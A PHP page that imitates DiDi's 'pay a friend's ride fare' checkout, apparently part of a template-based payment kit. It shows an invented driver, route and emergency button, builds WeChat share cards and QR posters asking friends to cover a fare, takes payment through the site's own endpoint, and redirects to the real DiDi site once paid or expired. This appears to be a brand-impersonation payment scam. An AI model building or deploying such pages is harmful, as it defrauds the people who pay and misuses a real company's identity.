<?php
require 'core.php';

// 1. 获取参数
$trade_no = !empty($_REQUEST['out_trade_no']) ? $_REQUEST['out_trade_no'] : (!empty($_REQUEST['trade_no']) ? $_REQUEST['trade_no'] : '');
$trade_no = strip_tags(trim($trade_no));

if(empty($trade_no)) die('错误：订单号缺失。');

// 2. 查询订单
$sql = "SELECT o.*, p.name as product_name, p.image, p.price, p.shop_name, 
        u.nickname as user_nick, u.avatar as user_avatar 
        FROM orders o 
        LEFT JOIN products p ON o.product_id = p.id 
        LEFT JOIN users u ON o.user_id = u.id 
        WHERE o.out_trade_no = ?";
$stmt = $DB->prepare($sql);
$stmt->execute([$trade_no]);
$order = $stmt->fetch();

if (!$order) { echo "<h3>😭 订单不存在</h3>"; exit; }

// 3. 状态判定 (【修改点】30分钟过期)
$is_paid = ($order['status'] == 1); 
$created_time = strtotime($order['create_time']);
$remaining_seconds = ($created_time + 1800) - time(); // 1800秒 = 30分钟
if ($remaining_seconds < 0) $remaining_seconds = 0;
$is_expired = ($remaining_seconds <= 0 && !$is_paid);

// === 按钮与状态文案逻辑 (【修改点】深度定制) ===
$btn_text = "为好友支付" . $order['money'] . "元";
$btn_url = "submit_pay.php?trade_no=".$trade_no."&tpl=cashier12";
$btn_class = ""; 
$top_status = "待支付";

if ($is_paid) {
    // === 已支付状态 ===
    $btn_text = "来迟了，代付已付款";
    $btn_url = "https://www.didiglobal.com"; // 跳转滴滴
    $btn_class = "btn-disabled";
    $top_status = "已支付";
} elseif ($is_expired) {
    // === 已过期状态 ===
    $btn_text = "订单已过期";
    $btn_url = "https://www.didiglobal.com"; // 跳转滴滴
    $btn_class = "btn-disabled";
    $top_status = "已过期";
}

// ============================================================
// 4. 【核心隐藏逻辑】(严防死守)
// ============================================================
$show_manager_tools = false; 
$from_param = isset($_GET['from']) ? $_GET['from'] : '';

if ($from_param !== 'share' && !$is_paid && !$is_expired) {
    if (isset($_SESSION['user_id']) && $_SESSION['user_id'] == $order['user_id']) {
        $show_manager_tools = true;
    }
}
// ============================================================

// 5. 分享配置
$protocol = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? "https://" : "http://";
$base_url = $protocol . $_SERVER['HTTP_HOST'];

$share_url = $base_url . '/cashier12.php?trade_no='.$trade_no.'&from=share';
$share_icon = (strpos($order['image'], 'http') === 0) ? $order['image'] : $base_url . '/' . ltrim($order['image'], '/');
$share_title = "滴滴代付请求";
$share_desc = "我正在使用滴滴打车，帮我付一下车费呗，谢谢！";
$sc = get_share_card_config('cashier12');
if ($sc && $sc['share_title'] !== '') {
    $share_title = $sc['share_title'];
    $share_desc = $sc['share_desc'];
    if ((int)$sc['use_product_image'] === 0) {
        if ($sc['share_image'] !== '') {
            $share_icon = (strpos($sc['share_image'], 'http') === 0) ? $sc['share_image'] : $base_url . '/' . ltrim($sc['share_image'], '/');
        }
    } else {
        $share_icon = !empty($order['image']) ? ((strpos($order['image'], 'http') === 0) ? $order['image'] : $base_url . '/' . ltrim($order['image'], '/')) : (get_config('share_icon') ?: $base_url . '/didi.png');
        if ($share_icon && strpos($share_icon, 'http') !== 0) $share_icon = $base_url . '/' . ltrim($share_icon, '/');
    }
}

$jsConfig = get_wx_js_config();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>滴滴打车</title>
    
    <meta property="og:title" content="<?php echo $share_title; ?>">
    <meta property="og:description" content="<?php echo $share_desc; ?>">
    <meta property="og:image" content="<?php echo $share_icon; ?>">

    <link rel="stylesheet" href="css/bootstrap-icons/bootstrap-icons.css">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            margin: 0; padding: 0; 
            background-color: #F3F4F6; /* 滴滴浅灰背景 */
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", Arial, sans-serif;
            padding-bottom: 100px; 
            color: #333;
        }

        /* 顶部导航已移除 */

        /* === 顶部状态大标题 === */
        .status-bar {
            background: #fff;
            padding: 15px 20px 15px; 
            font-size: 20px;
            font-weight: bold;
            color: #000;
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .status-bar i { margin-right: 10px; font-size: 18px; font-weight: bold; }

        /* === 通用白卡 === */
        .white-card {
            background: #fff;
            margin: 0 12px 12px;
            border-radius: 12px;
            padding: 15px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
            position: relative;
        }
        
        /* === 行程卡片 === */
        .route-card-full {
            padding: 0 !important; 
            overflow: hidden; 
        }
        .route-image-wrapper {
            position: relative;
            width: 100%;
        }
        .route-bg {
            display: block;
            width: 100%;
            height: auto;
        }
        
        /* 灰色小圆点 */
        .addr-dot {
            position: absolute;
            left: 12px; 
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ccc; 
            z-index: 2;
        }
        .dot-start { top: 25%; }
        .dot-end { bottom: 25%; }

        /* 起点/终点文字定位 */
        .addr-text {
            position: absolute;
            left: 28px; 
            font-size: 13px;
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            width: 80%;
        }
        .addr-start {
            top: 23%; 
            color: #333;
        }
        .addr-end {
            bottom: 23%; 
            color: #FF8000; 
            font-weight: 600;
        }

        /* === 司机/商品信息 === */
        .driver-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 20px;
            position: relative; 
        }
        .prod-name { font-size: 18px; font-weight: bold; color: #000; margin-bottom: 5px; }
        .driver-info { font-size: 12px; color: #999; display: flex; align-items: center; }
        .star-score { color: #FF8000; margin-left: 5px; margin-right: 5px; font-weight: bold; }
        
        /* 司机头像组合容器 */
        .driver-avatar-group {
            position: relative;
            width: 120px; 
            height: 50px;
            display: flex;
            justify-content: flex-end;
        }

        /* 小车背景图 */
        .car-bg-img {
            position: absolute;
            right: 40px;
            top: 10px;    
            height: 35px; 
            width: auto;
            z-index: 1; 
        }
        
        /* 司机头像 */
        .car-avatar {
            position: relative;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid #fff; 
            z-index: 2; 
            background: #fff; 
            box-shadow: -2px 2px 5px rgba(0,0,0,0.1);
        }

        /* 呼叫操作栏 */
        .action-row {
            display: flex;
            justify-content: space-around;
            text-align: center;
            padding-top: 10px;
        }
        .action-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #666;
            font-size: 11px;
        }
        .action-icon-circle {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #fff;
            border: 1px solid #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 6px;
            font-size: 16px;
            color: #555;
        }
        .icon-red { color: #FF4D4F; border-color: #FFE5E5; background: #FFF1F0; }

        /* === 费用详情 === */
        .bill-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            font-size: 14px;
            color: #000;
            border-bottom: 1px solid #f9f9f9;
        }
        .bill-row:last-child { border-bottom: none; }
        .bill-val { font-weight: 500; font-family: DIN, sans-serif; font-size: 15px; }
        .bill-gray { color: #999; font-size: 13px; display: flex; align-items: center; }
        .bill-tag { background: #FF8000; color: #fff; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 5px; }
        
        .total-price {
            text-align: center;
            padding: 20px 0 10px;
            font-size: 32px;
            font-weight: bold;
            font-family: DIN, sans-serif;
            color: #000;
        }
        .total-price small { font-size: 16px; }
        
        .bill-footer-tips {
            font-size: 11px;
            color: #999;
            text-align: center;
            margin-bottom: 10px;
        }

        /* === 支付方式 === */
        .pay-method-row {
            display: flex;
            align-items: center;
            font-size: 14px;
            font-weight: 500;
        }
        .wx-icon { color: #09BB07; font-size: 18px; margin-right: 8px; }
        .check-icon { margin-left: auto; color: #FF8000; font-size: 18px; opacity: 0.6; } 

        /* === 底部按钮 === */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: #fff;
            padding: 15px 20px 30px;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.03);
            z-index: 100;
        }
        .btn-pay {
            display: block;
            width: 100%;
            height: 50px;
            line-height: 50px;
            text-align: center;
            background: #274A8C; 
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            border-radius: 25px;
            text-decoration: none;
            border: none;
        }
        /* 失效/已支付按钮样式 */
        .btn-disabled { 
            background: #ccc !important; 
            cursor: pointer; /* 允许点击跳转 */
        }
        
        /* === 左下角安全悬浮 (缩小版) === */
        .blue-shield-float {
            position: fixed;
            bottom: 100px;
            left: 15px;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 90;
        }
        .blue-shield-float img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* 悬浮工具栏 */
        .floating-bar { position: fixed; right: 15px; bottom: 120px; z-index: 900; display: flex; flex-direction: column; gap: 15px; }
        .float-btn {
            width: 48px; height: 48px; background: #fff; border-radius: 50%;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            font-size: 10px; color: #666; cursor: pointer; transition: transform 0.1s;
        }
        .float-btn i { font-size: 20px; color: #FF8000; margin-bottom: 1px; }

        /* 遮罩与海报 */
        .mask { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; }
        .share-guide { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; text-align: right; padding: 20px; color: #fff; }
        
        .poster-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
        #poster-img { width: 80%; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        
        #poster-source { 
            position: fixed; left: -9999px; top: 0; width: 375px; background: #F3F4F6; border-radius: 0; overflow: hidden; 
            padding-bottom: 30px;
        }
    </style>
</head>
<body>

    <?php if ($show_manager_tools): ?>
    <div class="floating-bar">
        <div class="float-btn" onclick="showGuide()">
            <i class="bi bi-share-fill"></i>
            分享
        </div>
        <div class="float-btn" onclick="generatePoster()">
            <i class="bi bi-images"></i>
            海报
        </div>
    </div>
    <?php endif; ?>

    <div class="status-bar">
        <i class="bi bi-chevron-left"></i> <?php echo $top_status; ?>
    </div>

    <div class="white-card route-card-full">
        <div class="route-image-wrapper">
            <img src="henx.png" class="route-bg">
            <div class="addr-dot dot-start"></div>
            <div class="addr-text addr-start">当前位置</div>
            <div class="addr-dot dot-end"></div>
            <div class="addr-text addr-end">前往 <?php echo htmlspecialchars($order['shop_name'] ?: '目的地'); ?></div>
        </div>
    </div>

    <div class="white-card">
        <div class="driver-header">
            <div>
                <div class="prod-name"><?php echo htmlspecialchars($order['product_name']); ?></div>
                <div class="driver-info">
                    周师傅 <span class="star-score">★5.0</span> 1w+ 单
                </div>
            </div>
            
            <div class="driver-avatar-group">
                <img src="che.png" class="car-bg-img">
                <img src="<?php echo !empty($order['image']) ? htmlspecialchars($order['image']) : 'siji.png'; ?>" class="car-avatar" onerror="this.src='siji.png'">
            </div>
        </div>
        <hr style="border:0; border-top:1px solid #f9f9f9; margin:10px 0;">
        <div class="action-row">
            <div class="action-item">
                <div class="action-icon-circle icon-red" style="color:#ff4d4f; border-color:#fee;">110</div>
                紧急
            </div>
            <div class="action-item">
                <div class="action-icon-circle"><i class="bi bi-telephone-fill"></i></div>
                打电话
            </div>
            <div class="action-item">
                <div class="action-icon-circle"><i class="bi bi-info-circle-fill"></i></div>
                商家帮助
            </div>
        </div>
    </div>

    <div class="white-card">
        <div class="bill-row">
            <div>行程费用</div>
            <div class="bill-val"><?php echo $order['money']; ?>元 <i class="bi bi-chevron-down" style="font-size:12px; color:#999;"></i></div>
        </div>
        <div class="bill-row">
            <div>优惠券</div>
            <div class="bill-gray">无可用 <i class="bi bi-chevron-right"></i></div>
        </div>
        <div class="bill-row">
            <div>折上折优惠</div>
            <div class="bill-gray"><span class="bill-tag">暂无优惠</span> <i class="bi bi-chevron-right"></i></div>
        </div>
        
        <div class="total-price">
            <?php echo $order['money']; ?> <small>元</small>
        </div>
        
        <div class="bill-footer-tips">
            您正在为好友代付车费,取消订单支付金额将原路退回。
        </div>

        <hr style="border:0; border-top:1px solid #f9f9f9; margin:15px 0;">

        <div class="pay-method-row">
            <i class="bi bi-wechat wx-icon"></i> 微信支付
            <i class="bi bi-check-circle-fill check-icon" style="color:#FF8000; opacity:0.5;"></i>
        </div>
    </div>

    <div class="blue-shield-float">
        <img src="safe.png" alt="safe">
    </div>

    <div class="bottom-bar">
        <a href="<?php echo $btn_url; ?>" class="btn-pay <?php echo $btn_class; ?>">
            <?php echo $btn_text; ?>
        </a>
    </div>

    <div class="mask" onclick="$(this).fadeOut();$('.share-guide').fadeOut();$('#poster-modal').fadeOut();"></div>
    <div class="share-guide" onclick="$('.mask').fadeOut();$(this).fadeOut();">
        <img src="curved-arrow.svg" style="width:60px; transform: rotate(-90deg); margin-right: 20px;">
        <p style="font-size:18px; font-weight:bold; margin-top:10px;">点击右上角菜单<br>发送给朋友</p>
    </div>

    <div id="poster-source">
        <div style="text-align: center; padding: 20px 0; font-weight: bold; font-size: 18px; background:#fff;">
            滴滴出行
        </div>

        <div class="status-bar" style="border:none; padding-top: 5px;">
            <i class="bi bi-chevron-left"></i> 待支付
        </div>
        <div style="padding:0 20px 20px;">
            <div class="white-card route-card-full">
                <div class="route-image-wrapper">
                    <img src="henx.png" class="route-bg">
                    <div class="addr-dot dot-start"></div>
                    <div class="addr-text addr-start">当前位置</div>
                    <div class="addr-dot dot-end"></div>
                    <div class="addr-text addr-end">前往 <?php echo htmlspecialchars($order['shop_name'] ?: '目的地'); ?></div>
                </div>
            </div>

            <div class="white-card" style="text-align:center;">
                <div style="font-size:18px; font-weight:bold; margin-bottom:10px;">代付车费</div>
                <div style="font-size:40px; font-weight:bold; font-family:DIN; color:#000;">
                    <?php echo $order['money']; ?><small style="font-size:16px;">元</small>
                </div>
                <div id="qrcode-box" style="display:inline-block; margin-top:20px;"></div>
                <div style="font-size:12px; color:#999; margin-top:10px;">长按识别二维码代付</div>
            </div>
        </div>
    </div>

    <div id="poster-modal" class="poster-modal" onclick="$(this).fadeOut();$('.mask').fadeOut();">
        <img id="poster-img" src="">
        <div style="color:#fff; margin-top:15px; font-size:14px;">长按保存图片分享</div>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/qrcode.min.js"></script>
    <script src="js/html2canvas.min.js"></script>
    <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
    <script>
        function showGuide() {
            var mask = document.querySelector('.mask');
            var guide = document.querySelector('.share-guide');
            if (typeof $ !== 'undefined' && $ && $.fn && $.fn.fadeIn) {
                $('.mask').fadeIn(); $('.share-guide').fadeIn();
            } else if (mask && guide) {
                mask.style.display = 'block'; guide.style.display = 'block';
            }
        }
        
        function generatePoster() {
            if ($('#poster-img').attr('src')) {
                $('.mask').fadeIn();
                $('#poster-modal').css('display', 'flex').hide().fadeIn();
                return;
            }

            $('.mask').fadeIn();
            var loading = $('<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;z-index:10001;background:rgba(0,0,0,0.7);padding:10px 20px;border-radius:8px;">正在生成...</div>');
            $('body').append(loading);
            
            setTimeout(function() {
                html2canvas(document.getElementById('poster-source'), { 
                    useCORS: true, scale: 2, logging: false, backgroundColor: '#F3F4F6' 
                }).then(canvas => {
                    loading.remove();
                    $('#poster-img').attr('src', canvas.toDataURL("image/png"));
                    $('#poster-modal').css('display', 'flex').hide().fadeIn();
                });
            }, 10);
        }

        <?php if(!$is_paid && !$is_expired): ?>
        var rSeconds = <?php echo $remaining_seconds; ?>;
        function updateTimer() {
            if (rSeconds <= 0) {
                location.reload(); 
                return;
            }
            rSeconds--;
        }
        setInterval(updateTimer, 1000);
        <?php endif; ?>

        var wxConfig = <?php echo json_encode($jsConfig); ?>;
        if (wxConfig) {
            wxConfig.jsApiList = ['updateAppMessageShareData', 'updateTimelineShareData'];
            wx.config(wxConfig);
            wx.ready(function () {
                var shareData = { 
                    title: <?php echo json_encode($share_title); ?>, 
                    desc: <?php echo json_encode($share_desc); ?>, 
                    link: <?php echo json_encode($share_url); ?>, 
                    imgUrl: <?php echo json_encode($share_icon); ?> 
                };
                wx.updateAppMessageShareData(shareData);
                wx.updateTimelineShareData(shareData);
            });
        }

        $(function() {
            $('#qrcode-box').empty();
            new QRCode(document.getElementById("qrcode-box"), { text: "<?php echo $share_url; ?>", width: 120, height: 120 });
            $('.floating-bar .float-btn').first().off('click').on('click', function(e){ e.preventDefault(); showGuide(); });
        });
    </script>
</body>
</html>